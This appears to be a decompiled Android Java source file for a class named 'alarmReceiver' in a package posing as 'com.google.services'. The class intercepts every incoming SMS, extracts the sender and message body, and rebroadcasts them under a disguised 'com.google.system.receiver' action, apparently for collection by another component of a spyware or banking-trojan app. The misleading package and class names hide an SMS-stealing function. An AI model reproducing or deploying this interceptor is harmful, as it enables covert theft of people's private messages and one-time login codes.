package com.google.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class alarmReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        int i = 0;
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                Object[] objArr = (Object[]) extras.get("pdus");
                SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
                for (int i2 = 0; i2 < objArr.length; i2++) {
                    smsMessageArr[i2] = SmsMessage.createFromPdu((byte[]) objArr[i2]);
                }
                String str = null;
                while (i < smsMessageArr.length) {
                    str = smsMessageArr[i].getOriginatingAddress() + " : " + smsMessageArr[i].getMessageBody();
                    i++;
                }
                Intent intent2 = new Intent();
                intent2.setAction("com.google.system.receiver");
                Bundle bundle = new Bundle();
                bundle.putString("sms", str);
                intent2.putExtras(bundle);
                context.sendBroadcast(intent2);
            }
        }
    }
}
